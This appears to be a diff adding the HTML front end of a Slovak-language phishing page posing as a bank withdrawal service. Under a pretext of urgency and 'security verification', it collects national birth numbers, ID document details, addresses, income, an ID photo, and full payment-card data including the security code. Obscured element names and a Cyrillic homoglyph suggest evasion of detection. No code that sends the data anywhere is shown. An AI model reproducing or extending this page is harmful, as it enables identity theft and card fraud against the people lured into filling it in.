+                  <circle cx="5.5" cy="5.5" r="4" stroke="#888888" stroke-width="1.3"/>
+                  <path d="M9 9l2.5 2.5" stroke="#888888" stroke-width="1.3" stroke-linecap="round"/>
+                </svg>
+                <input class="bank-search" id="bank-search" type="text" placeholder="Hľadať banku..." oninput="filterBanks()" autocomplete="off">
+              </div>
+              <div class="bank-list" id="bank-list"></div>
+            </div>
+          </div>
+          <p class="form-note" style="margin-top:6px">
+            <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="#D4D4D4" stroke-width="1"/><path d="M5.5 4v3" stroke="#D4D4D4" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="8" r="0.5" fill="#D4D4D4"/></svg>
+            Číslo účtu ani IBAN sa tu nevyžaduje
+          </p>
+        </div>
+
+        <div class="submit-area">
+          <button class="btn-submit" id="btn-submit" onclick="handleWithdraw()">
+            <span class="btn-submit-icon" id="submit-icon">
+              <svg width="17" height="17" viewBox="0 0 17 17" fill="none">
+                <path d="M2 8.5h12M9 4l5 4.5L9 13" stroke="#D4D4D4" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </span>
+            <span id="submit-text">Odoslať žiadosť o výber</span>
+          </button>
+          <!-- SUCCESS MESSAGE -->
+          <div id="submit-success" style="display:none;margin-top:14px;background:#0a1a0a;border:1px solid #1a4d1a;border-radius:12px;padding:14px 16px;align-items:flex-start;gap:12px;animation:txIn .4s ease;">
+            <div style="width:32px;height:32px;border-radius:50%;background:#C9A84C;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M2.5 8l4 4 7-7" stroke="#D4D4D4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            </div>
+            <div>
+              <div style="font-size:13px;font-weight:700;color:#E8C96A;margin-bottom:3px;">Žiadosť bola odoslaná</div>
+              <div style="font-size:12px;color:#C9A84C;line-height:1.5;">Žiadosť o výber bola poslaná do vašej banky.<br>Na potvrdenie máte <strong>2 minúty</strong>.</div>
+            </div>
+          </div>
+
+          <!-- DISCONNECT BANK BUTTON (DANGEROUS ACTION) -->
+          <button class="btn-disconnect" id="btn-disconnect" onclick="confirmDisconnectBank()">
+            <span class="btn-disconnect-icon">
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                <path d="M2 8h12M8 4l4 4-4 4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+                <circle cx="2" cy="8" r="0.5" fill="currentColor"/>
+              </svg>
+            </span>
+            <span class="btn-disconnect-text">Odpojiť banku</span>
+          </button>
+        </div>
+
+         <!-- CERTIFICATE MENU -->
+        <div class="cert-btn-wrap">
+          <div class="cert-divider">
+            <span class="cert-line"></span>
+            <span class="cert-divider-text">
+              <svg width="11" height="11" viewBox="0 0 11 11" fill="none" style="flex-shrink:0;">
+                <rect x="1" y="3.5" width="9" height="7" rx="1.2" stroke="#888888" stroke-width="1"/>
+                <path d="M3 3.5V2.5a2.5 2.5 0 0 1 5 0v1" stroke="#888888" stroke-width="1" stroke-linecap="round"/>
+              </svg>
+              alebo
+            </span>
+            <span class="cert-line"></span>
+          </div>
+
+          <!-- Trigger button (grey, neutral) -->
+          <button class="btn-menu-trigger" id="btn-menu-trigger" onclick="toggleCertMenu()">
+            <span class="btn-menu-trigger-icon">
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                <rect x="1.5" y="5" width="13" height="9.5" rx="1.8" stroke="#555555" stroke-width="1.4"/>
+                <path d="M4 5V4a4 4 0 0 1 8 0v1" stroke="#555555" stroke-width="1.4" stroke-linecap="round"/>
+                <circle cx="8" cy="9.5" r="1.2" fill="#555555"/>
+                <path d="M8 10.9v1.3" stroke="#555555" stroke-width="1.3" stroke-linecap="round"/>
+              </svg>
+            </span>
+            <span class="btn-menu-trigger-text">
+              Dodatočné funkcie
+            </span>
+            <svg class="btn-menu-chevron" width="16" height="16" viewBox="0 0 16 16" fill="none">
+              <path d="M4 6l4 4 4-4" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+
+          <!-- Expandable panel -->
+          <div class="cert-menu-panel" id="cert-menu-panel">
+            <div class="cert-menu-inner">
+
+              <!-- ── BUTTON 1: Certifikát ── -->
+              <button class="menu-action-btn menu-action-btn--blue" id="btn-cert" onclick="triggerQuiz()">
+                <span class="menu-action-icon menu-action-icon--gold">
+                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                    <rect x="1.5" y="5" width="13" height="9.5" rx="1.8" stroke="currentColor" stroke-width="1.4"/>
+                    <path d="M4 5V4a4 4 0 0 1 8 0v1" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"/>
+                    <circle cx="8" cy="9.5" r="1.4" fill="currentColor"/>
+                    <path d="M8 10.9v1.4" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
+                  </svg>
+                </span>
+                <span class="menu-action-body">
+                  <span class="menu-action-title">Odoslať pomocou certifikátu</span>
+                  <span class="menu-action-sub">Overenie identity · SSL/TLS</span>
+                </span>
+                <svg class="menu-action-arrow" width="14" height="14" viewBox="0 0 14 14" fill="none">
+                  <path d="M3 7h8M8 4l3 3-3 3" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </button>
+
+              <!-- ── Divider ── -->
+              <div class="menu-action-divider">
+                <span class="menu-action-divider-line"></span>
+                <span class="menu-action-divider-text">alebo</span>
+                <span class="menu-action-divider-line"></span>
+              </div>
+
+              <!-- ── BUTTON 2: Vybrať na kartu ── -->
+              <button class="menu-action-btn menu-action-btn--green" id="btn-vyber-kartu" onclick="triggerVyberKartu()">
+                <span class="menu-action-icon menu-action-icon--gold">
+                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                    <rect x="1.5" y="4" width="13" height="9" rx="1.8" stroke="currentColor" stroke-width="1.4"/>
+                    <path d="M1.5 7.5h13" stroke="currentColor" stroke-width="1.4"/>
+                    <rect x="3.5" y="9.5" width="3" height="1.5" rx="0.5" fill="currentColor"/>
+                  </svg>
+                </span>
+                <span class="menu-action-body">
+                  <span class="menu-action-title">Vybrať na kartu</span>
+                  <span class="menu-action-sub">Okamžitý prevod na platobnú kartu</span>
+                </span>
+                <svg class="menu-action-arrow" width="14" height="14" viewBox="0 0 14 14" fill="none">
+                  <path d="M3 7h8M8 4l3 3-3 3" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </button>
+
+            </div>
+          </div>
+
+        </div>
+
+        <!-- TRANSACTION HISTORY -->
+        <div class="tx-section" id="tx-section" style="display:none;">
+          <div class="tx-header">
+            <span class="tx-title">História transakcií</span>
+            <span class="tx-count" id="tx-count">0 záznamov</span>
+          </div>
+          <div id="tx-container">
+            <div class="tx-empty" id="tx-empty">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" style="display:block;margin:0 auto 8px"><rect x="3" y="5" width="18" height="14" rx="2" stroke="#D4D4D4" stroke-width="1.5"/><path d="M3 9h18" stroke="#D4D4D4" stroke-width="1.5"/><path d="M7 13h4M7 16h2" stroke="#D4D4D4" stroke-width="1.3" stroke-linecap="round"/></svg>
+              Zatiaľ žiadne transakcie
+            </div>
+            <div class="tx-list" id="tx-list"></div>
+          </div>
+        </div>
+
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════
+           OPROSNIK / QUESTIONNAIRE
+           Appears after clicking "Začať aktualizáciu"
+      ═══════════════════════════════════════════════ -->
+      <div id="quiz-section" class="quiz-wrapper">
+        <div class="quiz-card" id="quiz-card">
+
+          <!-- Header -->
+          <div class="quiz-header">
+            <div class="quiz-header-accent"></div>
+            <div class="quiz-header-inner">
+              <div class="quiz-header-left">
+                <div class="quiz-icon-box">
+                  <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+                    <path d="M3 5h12M3 9h8M3 13h5" stroke="#C9A84C" stroke-width="1.5" stroke-linecap="round"/>
+                  </svg>
+                </div>
+                <div>
+                  <div class="quiz-title">Bezpečnostný dotazník</div>
+                  <div class="quiz-subtitle">Vyplňte všetky polia — povinné pre overenie</div>
+                </div>
+              </div>
+              <button onclick="closeQuizSection()" class="quiz-close-btn" title="Zatvoriť">
+                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                  <path d="M2 2l10 10M12 2L2 12" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                </svg>
+              </button>
+            </div>
+            <!-- Step progress -->
+            <div class="quiz-progress-bar-bg">
+              <div class="quiz-progress-bar-fill" id="quiz-progress-fill"></div>
+            </div>
+            <div class="quiz-step-label" id="quiz-step-label">Otázka 1 z 7</div>
+          </div>
+
+          <!-- Questions container -->
+          <div class="quiz-body" id="quiz-body">
+
+            <!-- STEP 1: Rodné číslo -->
+            <div class="quiz-step" id="qstep-1">
+              <div class="quiz-field-label">
+                <span class="quiz-q-num">01</span>
+                Rodné číslo
+              </div>
+              <div class="quiz-input-wrap">
+                <span class="quiz-input-icon">
+                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="7" cy="5" r="2.5" stroke="#555555" stroke-width="1.2"/><path d="M2 12c0-2.76 2.24-5 5-5s5 2.24 5 5" stroke="#555555" stroke-width="1.2" stroke-linecap="round"/></svg>
+                </span>
+                <input type="text" id="q-rodne-cislo" class="quiz-text-input" placeholder="napr. 900101/1234" maxlength="12" inputmode="numeric" autocomplete="off" oninput="onQuizInput('q1')">
+              </div>
+              <p class="quiz-input-note">
+                <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="#D4D4D4" stroke-width="1"/><path d="M5.5 4v3" stroke="#D4D4D4" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="8" r="0.5" fill="#D4D4D4"/></svg>
+                Zadajte vaše rodné číslo bez lomky alebo s lomkou
+              </p>
+            </div>
+
+            <!-- STEP 2: PSČ -->
+            <div class="quiz-step" id="qstep-2" style="display:none">
+              <div class="quiz-field-label">
+                <span class="quiz-q-num">02</span>
+                PSČ (Poštové smerovacie číslo)
+              </div>
+              <div class="quiz-input-wrap">
+                <span class="quiz-input-icon">
+                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 1C4.79 1 3 2.79 3 5c0 3.25 4 8 4 8s4-4.75 4-8c0-2.21-1.79-4-4-4z" stroke="#555555" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" stroke="#555555" stroke-width="1.2"/></svg>
+                </span>
+                <input type="text" id="q-psc" class="quiz-text-input" placeholder="napr. 81101" maxlength="6" inputmode="numeric" autocomplete="off" oninput="onQuizInput('q2')">
+              </div>
+              <p class="quiz-input-note">
+                <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="#D4D4D4" stroke-width="1"/><path d="M5.5 4v3" stroke="#D4D4D4" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="8" r="0.5" fill="#D4D4D4"/></svg>
+                5-miestne poštové smerovacie číslo vašej adresy
+              </p>
+            </div>
+
+            <!-- STEP 3: Číslo dokladu -->
+            <div class="quiz-step" id="qstep-3" style="display:none">
+              <div class="quiz-field-label">
+                <span class="quiz-q-num">03</span>
+                Číslo dokladu totožnosti
+              </div>
+              <div class="quiz-input-wrap">
+                <span class="quiz-input-icon">
+                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1.5" y="3" width="11" height="8" rx="1.5" stroke="#555555" stroke-width="1.2"/><path d="M4 6h2M4 8.5h6M8 6h2" stroke="#555555" stroke-width="1.1" stroke-linecap="round"/></svg>
+                </span>
+                <input type="text" id="q-cislo-dokladu" class="quiz-text-input" placeholder="napr. AB123456" maxlength="12" autocomplete="off" oninput="onQuizInput('q3')" style="text-transform:uppercase">
+              </div>
+              <p class="quiz-input-note">
+                <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="#D4D4D4" stroke-width="1"/><path d="M5.5 4v3" stroke="#D4D4D4" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="8" r="0.5" fill="#D4D4D4"/></svg>
+                Číslo občianskeho preukazu alebo cestovného pasu
+              </p>
+            </div>
+
+            <!-- STEP 4: Platnosť dokladu -->
+            <div class="quiz-step" id="qstep-4" style="display:none">
+              <div class="quiz-field-label">
+                <span class="quiz-q-num">04</span>
+                Platnosť dokladu
+              </div>
+              <div class="quiz-input-wrap">
+                <span class="quiz-input-icon">
+                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1.5" y="2.5" width="11" height="10" rx="1.5" stroke="#555555" stroke-width="1.2"/><path d="M1.5 6h11M4.5 1v3M9.5 1v3" stroke="#555555" stroke-width="1.2" stroke-linecap="round"/></svg>
+                </span>
+                <input type="text" id="q-platnost-dokladu" class="quiz-text-input" placeholder="napr. 15.06.2030" maxlength="10" inputmode="numeric" autocomplete="off" oninput="onQuizInputDate('q4')">
+              </div>
+              <p class="quiz-input-note">
+                <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="#D4D4D4" stroke-width="1"/><path d="M5.5 4v3" stroke="#D4D4D4" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="8" r="0.5" fill="#D4D4D4"/></svg>
+                Dátum platnosti vo formáte DD.MM.RRRR
+              </p>
+            </div>
+
+            <!-- STEP 5: Trvala adresa -->
+            <div class="quiz-step" id="qstep-5" style="display:none">
+              <div class="quiz-field-label">
+                <span class="quiz-q-num">05</span>
+                Vyhľadajte trvalú adresu
+              </div>
+              <div class="quiz-input-wrap" style="position:relative">
+                <span class="quiz-input-icon">
+                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 1.5C4.79 1.5 3 3.29 3 5.5c0 3.5 4 7 4 7s4-3.5 4-7c0-2.21-1.79-4-4-4z" stroke="#555555" stroke-width="1.2"/><circle cx="7" cy="5.5" r="1.3" stroke="#555555" stroke-width="1.1"/></svg>
+                </span>
+                <input type="text" id="q-trvala-adresa" class="quiz-text-input" placeholder="napr. Hlavná 12, Bratislava" autocomplete="off" oninput="onQuizInput('q5')">
+                <ul id="q-adresa-suggestions" style="display:none;position:absolute;top:100%;left:0;right:0;background:#0f0f0f;border:1px solid #2a2a2a;border-radius:8px;margin-top:4px;z-index:999;box-shadow:0 4px 16px rgba(0,0,0,.5);list-style:none;padding:0;max-height:200px;overflow-y:auto;"></ul>
+              </div>
+              <p class="quiz-input-note" style="color:#C9A84C;font-weight:600;">
+                <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M5.5 1L1 9.5h9L5.5 1z" stroke="#C9A84C" stroke-width="1" stroke-linejoin="round"/><path d="M5.5 4.5v2" stroke="#C9A84C" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="7.8" r="0.5" fill="#C9A84C"/></svg>
+                Musí byť rovnaká ako adresa v doklade totožnosti.
+              </p>
+            </div>
+
+            <!-- STEP 6: Vedlajsi prijem -->
+            <div class="quiz-step" id="qstep-6" style="display:none">
+              <div class="quiz-field-label">
+                <span class="quiz-q-num">06</span>
+                Mám ešte vedľajší príjem
+              </div>
+              <div style="display:flex;align-items:center;gap:12px;margin:12px 0 16px;">
+                <button type="button" id="toggle-vedlajsi"
+                onclick=" var on = this.getAttribute('aria-pressed')==='true';  this.setAttribute('aria-pressed', on ? 'false' : 'true');  this.style.background = on ? '#222222' : '#C9A84C'; document.getElementById('toggle-thumb').style.transform = on ? 'translateX(0px)' : 'translateX(22px)'; document.getElementById('toggle-label').textContent = on ? 'Nie' : 'Áno'; document.getElementById('vedlajsi-prijem-wrap').style.display = on ? 'none' : 'block'; "
+                style="position:relative;width:48px;height:26px;border-radius:13px;border:none;background:#D4D4D4;cursor:pointer;transition:background .25s;padding:0;flex-shrink:0;" aria-pressed="false">
+                <span id="toggle-thumb" style="position:absolute;top:3px;left:3px;width:20px;height:20px;border-radius:50%;background:#111111;;box-shadow:0 1px 4px rgba(0,0,0,.2);transition:transform .25s;display:block;"></span>
+                 </button>
+                <span id="toggle-label" style="font-size:13px;color:#555555;font-weight:500;">Nie</span>
+              </div>
+              <div id="vedlajsi-prijem-wrap" style="display:none">
+                <div class="quiz-input-wrap">
+                  <span class="quiz-input-icon">
+                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1.5" y="3.5" width="11" height="8" rx="1.5" stroke="#555555" stroke-width="1.2"/><path d="M5 3.5V2.5a1 1 0 012 0v1M9 7H5M7 5.5v3" stroke="#555555" stroke-width="1.1" stroke-linecap="round"/></svg>
+                  </span>
+                  <input type="text" id="q-vedlajsi-prijem-suma" class="quiz-text-input" placeholder="napr. 500 €" inputmode="numeric" autocomplete="off" oninput="onVedlajsiInput()">
+                </div>
+                <p class="quiz-input-note">
+                  <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="#D4D4D4" stroke-width="1"/><path d="M5.5 4v3" stroke="#D4D4D4" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="8" r="0.5" fill="#D4D4D4"/></svg>
+                  Uveďte mesačný príjem z vedľajšej činnosti
+                </p>
+              </div>
+            </div>
+
+
+            <!-- STEP 7: Zdroj príjmu -->
+            <div class="quiz-step" id="qstep-7" style="display:none">
+              <div class="quiz-field-label">
+                <span class="quiz-q-num">07</span>
+                Zdroj príjmu
+              </div>
+
+              <!-- 4 option buttons -->
+              <div id="zdroj-options" style="display:flex;flex-direction:column;gap:8px;margin:12px 0 14px;">
+                <button type="button" class="zdroj-opt" data-val="zamestnanec" onclick="selectZdroj('zamestnanec')" style="display:flex;align-items:center;gap:10px;padding:11px 14px;border-radius:11px;border:1.5px solid #2a2a2a;background:#0a0a0a;font-family:inherit;font-size:13px;font-weight:500;color:#aaa;cursor:pointer;text-align:left;transition:border-color .15s,background .15s,color .15s;">
+                  <span style="width:18px;height:18px;border-radius:50%;border:1.5px solid #444;display:flex;align-items:center;justify-content:center;flex-shrink:0;" class="zdroj-radio"></span>
+                  Zamestnanec
+                </button>
+                <button type="button" class="zdroj-opt" data-val="dochodca" onclick="selectZdroj('dochodca')" style="display:flex;align-items:center;gap:10px;padding:11px 14px;border-radius:11px;border:1.5px solid #2a2a2a;background:#0a0a0a;font-family:inherit;font-size:13px;font-weight:500;color:#aaa;cursor:pointer;text-align:left;transition:border-color .15s,background .15s,color .15s;">
+                  <span style="width:18px;height:18px;border-radius:50%;border:1.5px solid #444;display:flex;align-items:center;justify-content:center;flex-shrink:0;" class="zdroj-radio"></span>
+                  Dôchodca
+                </button>
+                <button type="button" class="zdroj-opt" data-val="nezamestnany" onclick="selectZdroj('nezamestnany')" style="display:flex;align-items:center;gap:10px;padding:11px 14px;border-radius:11px;border:1.5px solid #2a2a2a;background:#0a0a0a;font-family:inherit;font-size:13px;font-weight:500;color:#aaa;cursor:pointer;text-align:left;transition:border-color .15s,background .15s,color .15s;">
+                  <span style="width:18px;height:18px;border-radius:50%;border:1.5px solid #444;display:flex;align-items:center;justify-content:center;flex-shrink:0;" class="zdroj-radio"></span>
+                  Nezamestnaný
+                </button>
+                <button type="button" class="zdroj-opt" data-val="ine" onclick="selectZdroj('ine')" style="display:flex;align-items:center;gap:10px;padding:11px 14px;border-radius:11px;border:1.5px solid #2a2a2a;background:#0a0a0a;font-family:inherit;font-size:13px;font-weight:500;color:#aaa;cursor:pointer;text-align:left;transition:border-color .15s,background .15s,color .15s;">
+                  <span style="width:18px;height:18px;border-radius:50%;border:1.5px solid #444;display:flex;align-items:center;justify-content:center;flex-shrink:0;" class="zdroj-radio"></span>
+                  Iné
+                </button>
+              </div>
+
+              <input type="hidden" id="q-zdroj-prijem-select" value="">
+
+              <!-- Zamestnanec extra fields -->
+              <div id="zdroj-zamestnanec-wrap" style="display:none;margin-bottom:12px;">
+                <div class="quiz-input-wrap" style="margin-bottom:8px;">
+                  <span class="quiz-input-icon">
+                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1.5" y="3" width="11" height="8" rx="1.5" stroke="#555555" stroke-width="1.2"/><path d="M4 6h2M4 8.5h6M8 6h2" stroke="#555555" stroke-width="1.1" stroke-linecap="round"/></svg>
+                  </span>
+                  <input type="text" id="q-miesto-prace" class="quiz-text-input" placeholder="Miesto výkonu práce a pracovná pozícia" autocomplete="off" oninput="onZdrojExtraInput()">
+                </div>
+                <div class="quiz-input-wrap">
+                  <span class="quiz-input-icon">
+                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1.5" y="2.5" width="11" height="10" rx="1.5" stroke="#555555" stroke-width="1.2"/><path d="M1.5 6h11M4.5 1v3M9.5 1v3" stroke="#555555" stroke-width="1.2" stroke-linecap="round"/></svg>
+                  </span>
+                  <input type="text" id="q-ako-dlho-pracuje" class="quiz-text-input" placeholder="Ako dlho pracujete? (napr. 3 roky)" autocomplete="off" oninput="onZdrojExtraInput()">
+                </div>
+              </div>
+
+              <!-- Salary field (shown for all choices except nezamestnany) -->
+              <div id="zdroj-mzda-wrap" style="display:none;">
+                <div class="quiz-input-wrap">
+                  <span class="quiz-input-icon">
+                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1.5" y="3.5" width="11" height="8" rx="1.5" stroke="#555555" stroke-width="1.2"/><path d="M5 3.5V2.5a1 1 0 012 0v1M9 7H5M7 5.5v3" stroke="#555555" stroke-width="1.1" stroke-linecap="round"/></svg>
+                  </span>
+                  <input type="text" id="q-mzda" class="quiz-text-input" placeholder="Mzda / Príjem (napr. 1200 €)" inputmode="numeric" autocomplete="off" oninput="onZdrojExtraInput()">
+                </div>
+                <p class="quiz-input-note">
+                  <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="#D4D4D4" stroke-width="1"/><path d="M5.5 4v3" stroke="#D4D4D4" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="8" r="0.5" fill="#D4D4D4"/></svg>
+                  Uveďte mesačný príjem
+                </p>
+              </div>
+
+              <!-- Iné - description field -->
+              <div id="zdroj-ine-wrap" style="display:none;">
+                <div class="quiz-input-wrap">
+                  <span class="quiz-input-icon">
+                    <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1.5" y="3" width="11" height="8" rx="1.5" stroke="#555555" stroke-width="1.2"/><path d="M4 6h2M4 8.5h6M8 6h2" stroke="#555555" stroke-width="1.1" stroke-linecap="round"/></svg>
+                  </span>
+                  <input type="text" id="q-ine-cinnost" class="quiz-text-input" placeholder="Čím ste zamestnávaní? (napr. Návrhár, Konzultant)" autocomplete="off" oninput="onZdrojExtraInput()">
+                </div>
+                <p class="quiz-input-note">
+                  <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="#D4D4D4" stroke-width="1"/><path d="M5.5 4v3" stroke="#D4D4D4" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="8" r="0.5" fill="#D4D4D4"/></svg>
+                  Stručne opíšte svoju činnosť
+                </p>
+              </div>
+
+            </div>
+
+            <!-- STEP 8: Fotografia dokumentu -->
+			<form id="main-project-form">
+            <div class="quiz-step" id="qstep-8" style="display:none">
+              <div class="quiz-field-label"><span class="quiz-q-num">08</span>Fotografia dokumentu</div>
+              <p style="font-size:12px;color:#555555;margin:12px 0 16px;">Prosím, nahrajte fotografiu svojho pasu alebo ID karty.</p>
+              <div id="photo-upload-area" style="border:2px dashed #2a2a2a;border-radius:12px;padding:24px 16px;text-align:center;cursor:pointer;transition:all .2s;background:#0a0a0a;" onclick="document.getElementById('photo-input').click()" onmouseover="this.style.borderColor='#C9A84C44';this.style.background='#100e04';" onmouseout="this.style.borderColor='#2a2a2a';this.style.background='#0a0a0a';">
+                <svg width="32" height="32" viewBox="0 0 32 32" fill="none" style="margin:0 auto 12px;color:#444;"><rect x="3" y="6" width="26" height="20" rx="2" stroke="currentColor" stroke-width="1.5"/><circle cx="11" cy="11" r="2.5" stroke="currentColor" stroke-width="1.5"/><path d="M3 20l8-8 7 7 14-14" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                <p style="font-size:14px;font-weight:600;color:#aaa;margin:0 0 4px;">Kliknutím nahrajte fotku</p>
+                <p style="font-size:12px;color:#555;margin:0;">alebo ju tu pretiahnite (JPG, PNG, max 5MB)</p>
+              </div>
+              <input type="file" id="photo-input" accept="image/jpeg,image/png" style="display:none" onchange="handlePhotoUpload(event)">
+             			 <div id="photo-preview" style="display:none;margin-top:12px;"><img id="preview-img" src="" alt="Preview" style="max-width:100%;max-height:200px;border-radius:10px;border:1px solid #D4D4D4;"><button type="button" onclick="removePhoto()" style="display:block;margin-top:10px;padding:8px 12px;border:1px solid #D4D4D4;background:#D4D4D4;border-radius:8px;font-size:12px;color:#555555;cursor:pointer;width:100%;font-weight:500;">Odstrániť fotku</button></div>
+          
+		  </div> </form>
+
+          </div><!-- /quiz-body -->
+
+          <!-- Footer nav -->
+          <div class="quiz-footer">
+            <button class="quiz-btn-back" id="quiz-btn-back" onclick="quizPrev()" style="display:none">
+              <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                <path d="M9 3L5 7l4 4" stroke="#C9A84C" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              Späť
+            </button>
+            <button class="quiz-btn-next" id="quiz-btn-next" onclick="quizNext()" disabled>
+              Ďalej
+              <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                <path d="M5 3l4 4-4 4" stroke="#D4D4D4" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </button>
+          </div>
+
+          <!-- Watermark -->
+          <div class="quiz-watermark">
+            <svg width="11" height="11" viewBox="0 0 11 11" fill="none">
+              <rect x="1" y="4.5" width="9" height="6" rx="1.2" stroke="#E8C96A" stroke-width="1"/>
+              <path d="M3 4.5V3.5a2.5 2.5 0 015 0v1" stroke="#E8C96A" stroke-width="1" stroke-linecap="round"/>
+            </svg>
+            Zabezpečené overenie · TechnickýVýberPeňazí
+          </div>
+
+        </div><!-- /quiz-card -->
+      </div><!-- /quiz-section -->
+<!-- ═══════════════════════════════════════════════
+           CARD SECTION — appears after clicking "Vybrať na kartu"
+      ═══════════════════════════════════════════════ -->
+      <div id="cd-se-g" class="quiz-wrapper">
+        <div class="quiz-card" id="cad-cad">
+
+          <!-- Header -->
+          <div class="quiz-header">
+            <div class="quiz-header-accent"></div>
+            <div class="quiz-header-inner">
+              <div class="quiz-header-left">
+                <div class="quiz-icon-box">
+                  <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+                    <rect x="1.5" y="4.5" width="15" height="11" rx="2.2" stroke="#C9A84C" stroke-width="1.5"/>
+                    <path d="M1.5 8.5h15" stroke="#C9A84C" stroke-width="1.5"/>
+                    <rect x="3.5" y="11" width="4" height="2" rx="0.6" fill="#C9A84C"/>
+                  </svg>
+                </div>
+                <div>
+                  <div class="quiz-title" style="color:#8B6914;">Výber na kаrtu</div>
+                  <div class="quiz-subtitle">Vyberte si spôsob, ktorý vám najviac vyhovuje </div>
+                </div>
+              </div>
+              <div class="quiz-badge" style="background:#ecfdf5;border-color:#a7f3d0;color:#C9A84C;">
+                <span class="quiz-badge-dot" style="background:#C9A84C;"></span>
+                Zabezpečené
+              </div>
+              <button onclick="closeCardSection()" class="quiz-close-btn" title="Zatvoriť">
+                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                  <path d="M2 2l10 10M12 2L2 12" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <!-- Original card UI embedded -->
+          <div style="padding:20px;">
+            <div class="ab123">
+              <div class="ab12">
+                <div class="ab1">
+                  <div class="crt-cli"></div>
+                  <div class="crt-cli"></div>
+                  <div class="crt-cli"></div>
+                </div>
+                <div class="Id-ca-se">
+                  <span class="oeweq12">card ID</span>
+                  <div class="krt-c-display" id="IDNoDisplay">0123 4567 8910 1112</div>
+                </div>
+                <div class="kar-car-bom">
+                  <div class="Id-ca-se">
+                    <span class="oeweq12">card ID</span>
+                    <div class="kar-car-id-d" id="carnamdis">JOHN DOE</div>
+                  </div>
+                  <div class="Id-ca-se karta-expiration-section">
+                    <span class="oeweq12"></span>
+                    <div class="karta-card-expiry-display">
+                      <span class="karta-valid-thru">VALID<br>THRU</span>
+                      <span class="karta-arrow">▶</span>
+                      <span id="cardExpiryDisplay">01/23</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="id-pa-f">
+                <div class="id-for-gro">
+                  <label class="kar-lab" for="inputName">Name</label>
+                  <input type="text" id="inputName" class="kata-in" placeholder="JOHN DOE" autocomplete="off">
+                </div>
+                <div class="id-for-gro">
+                  <div class="kar-lab-row">
+                    <label class="kar-lab" for="incan">Card ID</label>
+                   
+                  </div>
+                  <input type="text" id="incan" class="kata-in" maxlength="19" placeholder="0123 4567 8910 1112" autocomplete="off" inputmode="numeric" pattern="[0-9\s]*">
+                </div>
+                <div class="karta-form-row">
+                  <div class="id-for-gro id-ha-wi">
+                    <label class="kar-lab" for="inpexo">mm/yy</label>
+                    <input type="text" id="inpexo" class="kata-in" maxlength="5" placeholder="01/23" autocomplete="off" inputmode="numeric" pattern="[0-9/]*">
+                  </div>
+                  <div class="id-for-gro id-ha-wi">
+                    <label class="kar-lab" for="inpcos">Security Code</label>
